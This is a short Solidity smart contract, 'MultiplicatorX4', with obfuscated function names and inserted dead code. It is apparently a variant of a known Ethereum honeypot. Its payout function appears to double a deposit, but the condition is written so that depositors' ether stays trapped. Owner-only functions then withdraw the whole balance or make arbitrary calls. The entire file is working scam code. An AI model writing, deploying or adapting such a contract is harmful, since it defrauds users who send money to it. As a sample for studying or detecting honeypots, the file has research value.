// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x251137()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xbe606c,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xbe606c.call.value(msg.value)(data);
    }

    function _0xef1d21(address _0xbe606c)
    public
    payable
    {
        if (false) { revert(); }
        if (false) { revert(); }
        if(msg.value>=this.balance)
        {
            _0xbe606c.transfer(this.balance+msg.value);
        }
    }
}